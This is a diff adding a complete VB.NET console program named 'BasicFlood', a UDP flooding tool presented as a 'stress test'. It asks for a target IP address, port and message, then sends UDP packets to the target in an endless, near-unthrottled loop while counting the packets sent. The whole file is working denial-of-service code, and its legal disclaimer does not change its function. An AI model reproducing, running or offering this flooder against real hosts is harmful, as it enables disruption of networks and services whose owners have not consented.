@@ -1,0 +1,230 @@
+'Nicola Salsotto | 2013-2014
+
+'######################################################################### 
+'#  This program is free software; you can redistribute it and/or modify # 
+'#  it under the terms of the GNU General Public License as published by # 
+'#  the Free Software Foundation; either version 2 of the License, or    # 
+'#  (at your option) any later version.                                  # 
+'#                                                                       # 
+'#  This program is distributed in the hope that it will be useful,      # 
+'#  but WITHOUT ANY WARRANTY; without even the implied warranty of       # 
+'#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        # 
+'#  GNU General Public License for more details.                         # 
+'#                                                                       # 
+'#  You should have received a copy of the GNU General Public License    # 
+'#  along with this program; if not, write to the Free Software          # 
+'#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           # 
+'#  MA 02110-1301, USA.                                                  # 
+'############################# DISCLAIMER ################################ 
+'#  Usage of this software for probing/attacking targets without prior   # 
+'#  mutual consent, is illegal. It's the end user's responsability to    # 
+'#  obey alla applicable local laws. Developers assume no liability and  # 
+'#  are not responible for any missue or damage caused by thi program    # 
+'######################################################################### 
+ 
+'        GGGGGGGGGGGGGPPPPPPPPPPPPPPPPP   LLLLLLLLLLL             
+'     GGG::::::::::::GP::::::::::::::::P  L:::::::::L             
+'   GG:::::::::::::::GP::::::PPPPPP:::::P L:::::::::L             
+'  G:::::GGGGGGGG::::GPP:::::P     P:::::PLL:::::::LL             
+' G:::::G       GGGGGG  P::::P     P:::::P  L:::::L               
+'G:::::G                P::::P     P:::::P  L:::::L               
+'G:::::G                P::::PPPPPP:::::P   L:::::L               
+'G:::::G    GGGGGGGGGG  P:::::::::::::PP    L:::::L               
+'G:::::G    G::::::::G  P::::PPPPPPPPP      L:::::L               
+'G:::::G    GGGGG::::G  P::::P              L:::::L               
+'G:::::G        G::::G  P::::P              L:::::L               
+' G:::::G       G::::G  P::::P              L:::::L         LLLLLL
+'  G:::::GGGGGGGG::::GPP::::::PP          LL:::::::LLLLLLLLL:::::L
+'   GG:::::::::::::::GP::::::::P          L::::::::::::::::::::::L
+'     GGG::::::GGG:::GP::::::::P          L::::::::::::::::::::::L
+'        GGGGGG   GGGGPPPPPPPPPP          LLLLLLLLLLLLLLLLLLLLLLLL
+
+
+
+Module mod_0
+
+
+    Public version As String = "1.1.3.6"
+
+    Friend Indirizzo_IP As String = Nothing
+    Friend PORT As String = Nothing
+    Friend TEXTb As String = Nothing
+    Friend PackSend As Int64 = 0
+    Friend ResetTime As Integer = 0
+    Friend ThreadSec As System.Threading.Thread
+    Friend TEXT As String = Nothing
+
+    Public Sub DoWork()
+
+        While 1
+            Reset(PackSend)
+            'Threading.Thread.Sleep(400)
+            Threading.Thread.Sleep(800)
+        End While
+    End Sub
+
+    Public Sub Reset(ByVal currentPack As Int64)
+
+        Console.Title = "BasicFlood | Sent packets: " & currentPack
+        Console.Clear()
+        Console.Write("IP: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(Indirizzo_IP)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  PORT: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(PORT)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  MESSAGE:")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(TEXTb)
+        Console.ForegroundColor = ConsoleColor.Gray
+
+        Console.Write(vbCrLf & vbCrLf & "Sent packets: " & currentPack)
+    End Sub
+
+
+
+    Sub Main()
+        '# ---INTRO BEGIN---
+        Console.Title = "BasicFlood"
+        Console.Write(vbCrLf & vbCrLf)
+        Console.Write("        ____            _      ______ _                 _ " & vbCrLf & "       |  _ \          (_)    |  ____| |               | |" & vbCrLf & "       | |_) | __ _ ___ _  ___| |__  | | ___   ___   __| |" & vbCrLf & "       |  _ < / _` / __| |/ __|  __| | |/ _ \ / _ \ / _` |" & vbCrLf & "       | |_) | (_| \__ \ | (__| |    | | (_) | (_) | (_| |" & vbCrLf & "       |____/ \__,_|___/_|\___|_|    |_|\___/ \___/ \__,_|" & vbCrLf)
+        Console.Write(vbCrLf & vbCrLf & "================================================================================")
+        Console.Write("                                        |                                       " & " BasicFlood v. " & version & "                  |    ____ ____ ____ ____ ____ ____" & vbCrLf & " Welcome!                               |   ||G |||I |||T |||H |||U |||B ||  " & vbCrLf & " Created by ")
+        Console.ForegroundColor = ConsoleColor.White
+        Console.Write("Nicola Salsotto")
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("             |   ||__|||__|||__|||__|||__|||__||   " & vbCrLf & " https://github.com/nicolasalsotto/     |   |/__\|/__\|/__\|/__\|/__\|/__\|" & vbCrLf & "                                        |")
+        Console.Write(vbCrLf & "                                        |                                       ")
+        Console.Write("================================================================================" & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf)
+
+
+        Console.Write("                                                             HIT ENTER TO BEGIN")
+        Console.ReadLine()
+        Console.Clear()
+        '# ---INTRO END---
+        init()
+        '81
+
+    End Sub
+
+    Sub init()
+        Console.Write("IP: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("00.00.00.00")
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  PORT: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("00")
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  MESSAGE: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("[nothing]")
+
+        'Console.ForegroundColor = ConsoleColor.Blue
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write(vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & "IP: ")
+
+        Indirizzo_IP = Console.ReadLine()
+        If Indirizzo_IP = "" Then Indirizzo_IP = "192.168.1.1"
+        Console.Clear()
+        Console.Write("IP: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(Indirizzo_IP)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  PORT: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("00")
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  MESSAGE: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("[nothing]")
+        Console.ForegroundColor = ConsoleColor.Gray
+
+        Console.Write(vbCrLf & vbCrLf & vbCrLf & vbCrLf & "Tip: write 80 if you do not know what is this" & vbCrLf & vbCrLf & "PORT: ")
+        PORT = Console.ReadLine()
+        If PORT = "" Then PORT = "80"
+        Console.Clear()
+        Console.Write("IP: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(Indirizzo_IP)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  PORT: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(PORT)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  MESSAGE: ")
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write("[nothing]")
+        Console.ForegroundColor = ConsoleColor.Gray
+
+        Console.Write(vbCrLf & vbCrLf & vbCrLf & vbCrLf & "" & vbCrLf & vbCrLf & "TEXT TO SEND: ")
+        TEXT = Console.ReadLine()
+        If TEXT = "" Then
+            TEXTb = "[nothing]"
+        Else
+            TEXTb = TEXT
+        End If
+
+        Console.Clear()
+        Console.Write("IP: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(Indirizzo_IP)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  PORT: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(PORT)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.Write("  MESSAGE: ")
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.Write(TEXTb)
+        Console.ForegroundColor = ConsoleColor.Gray
+
+
+        Console.ForegroundColor = ConsoleColor.Red
+        Console.Write(vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & "              ***HIT ENTER TO START THE STRESS TEST***" & vbCrLf & vbCrLf)
+        Console.ForegroundColor = ConsoleColor.Gray
+        Console.ReadLine()
+
+
+
+
+
+        Console.Write(vbCrLf & vbCrLf & "STARTING...")
+
+        ThreadSec = New System.Threading.Thread(AddressOf DoWork)
+        ThreadSec.Priority = Threading.ThreadPriority.Lowest
+        ThreadSec.Start()
+
+        Dim clientUDP As New System.Net.Sockets.UdpClient
+        Dim ipAddr As System.Net.IPAddress
+        Dim sendByte As Byte() = New Byte() {}
+        ipAddr = System.Net.IPAddress.Parse(Indirizzo_IP)
+        clientUDP.Connect(Indirizzo_IP, PORT)
+        sendByte = System.Text.Encoding.ASCII.GetBytes(TEXT)
+
+
+        While 1
+            clientUDP.Send(sendByte, sendByte.Length)
+            If PackSend < 20000000 Then
+                PackSend += 1
+            Else
+                PackSend = 0
+            End If
+
+
+            If ResetTime >= 10000 Then
+
+                ResetTime = 0
+                Threading.Thread.Sleep(1)
+            End If
+            ResetTime += 1
+
+        End While
+    End Sub
+
+
+
+
+End Module
